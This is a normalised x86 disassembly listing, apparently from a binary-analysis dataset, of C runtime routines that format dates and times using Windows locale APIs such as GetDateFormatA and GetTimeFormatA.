jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1003267b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_10027728
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
shl esi 0x2
push [ esi + edi + 0x1c ]
call sub_10024630
push [ esi + edi ]
mov [ ebp - 0x8 ] eax
call sub_10024630
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1002a000
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_10024630
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
push esi
call sub_10024630
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_10032784
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_10027728
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] 0xc
push [ esi + 0x30 ]
call sub_10024630
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_10024630
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x4 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1002a000
mov esi eax
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
add edi 0x68
mov [ ebp - 0x8 ] 0xc
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_10024630
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
push esi
call sub_10024630
add esi eax
add edi 0x4
dec [ ebp - 0x8 ]
pop ecx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_1003288d
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_10027728
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
shl ebx 0x2
push [ ebx + esi + 0x1c ]
call sub_10024630
push [ ebx + esi ]
mov [ ebp - 0x14 ] eax
call sub_10024630
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_10024630
push [ ebx ]
mov [ ebp - 0x14 ] eax
call sub_10024630
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
add eax edi
dec [ ebp - 0xc ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_10024630
push [ esi + 0x98 ]
mov ebx eax
call sub_10024630
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_10024630
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_10024630
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_10024630
lea eax [ edi + eax + 0xb9 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_1002a000
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xb8
push esi
push ebx
lea edi [ ebx + 0xb8 ]
call sub_10026f10
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
push edi
call sub_10024630
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
push edi
call sub_10024630
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0xc
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_10024630
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
push edi
call sub_10024630
add [ ebp - 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
dec [ ebp - 0x14 ]
pop ecx
lea edi [ edi + eax + 0x1 ]
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_10024630
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
push edi
call sub_10024630
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
push edi
call sub_10024630
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
push edi
call sub_10024630
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_1002b660
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
sub_10032bed
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_10032c0d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_10032c88
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
cmp eax 0x59
push esi
push edi
mov ebx ecx
mov esi edx
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x5a
je r-xdata
call sub_1002972b
xor edi edi
jmp r-xdata
cmp eax 0x1fa3
jle r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
call sub_1002972b
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_100376d8
call sub_10037359
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
mov ecx ebx
setne al
mov ebx eax
mov edx [ edx + ebx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax 0x7
je r-xdata
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
sub eax 0x4
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xb
mov edx [ ebp + 0x10 ]
jg r-xdata
cmp eax 0x6
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
call sub_10032bed
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
pop edx
xor edi edi
cmp eax edi
jl r-xdata
mov eax [ esi ]
dec eax
dec eax
je r-xdata
cmp eax 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push edi
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
cmp eax 0x3b
jmp r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
dec eax
je r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
cmp eax edi
jne r-xdata
sub eax 0x18
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi ebx
call sub_10032c0d
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10033070
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push ecx
pop eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax ] 0x25
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
jmp r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
jmp r-xdata
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10033070
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] edi
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
xor edi edi
cmp esi edi
jl r-xdata
cmp eax 0x16d
jg r-xdata
cmp eax edi
je r-xdata
push ebx
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov [ eax ] 0x20
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
push eax
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
cmp eax edi
jl r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_10033070
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x1c ]
xor ebx ebx
sub eax ebx
push edi
je r-xdata
mov edi [ esi + 0xa0 ]
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x2
mov ecx [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ esi + 0xa4 ]
jmp r-xdata
mov edi [ esi + 0xa8 ]
jmp r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov edx 0x76c
add dx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x20 ] dx
mov dx [ eax + 0x10 ]
inc dx
mov [ ebp - 0x1e ] dx
mov dx [ eax + 0xc ]
mov [ ebp - 0x1a ] dx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x18 ] dx
mov dx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x14 ] ax
push ebx
xor eax eax
push edi
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ esi + 0xac ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x16 ] dx
call ecx
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ GetTimeFormatA@IAT ]
cmp [ esi + 0xb0 ] 0x1
mov eax [ ebp + 0x10 ]
je r-xdata
xor edx edx
mov [ ebp - 0x8 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xc ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_100272fd
pop ecx
cmp eax ebx
je r-xdata
call sub_10034470
mov eax esp
cmp eax ebx
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x10 ]
mov ebx eax
push ebx
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push [ esi + 0xac ]
call [ ebp - 0xc ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x8 ]
call sub_10029bcd
pop ecx
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov ecx esi
push ebx
push [ ebp + 0x8 ]
call sub_10032c88
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_10037727
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov edx [ ecx ]
mov [ ebp - 0x10 ] eax
mov al [ ebx ]
mov [ edx ] al
inc [ ecx ]
mov eax [ ebp - 0x10 ]
inc ebx
dec [ esi ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
push [ ebp + 0x8 ]
push ecx
call sub_100348f7
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp + 0x1c ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_10037727
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
mov eax edx
dec eax
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_100348f7
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp + 0x8 ]
push eax
call sub_100348f7
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_100348f7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov al 0x42
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
sub_100334d1
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_10027728
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_1002972b
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_100348f7
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov al [ esi ]
lea ecx [ ebp + 0x8 ]
call sub_10032c88
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_10033675
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
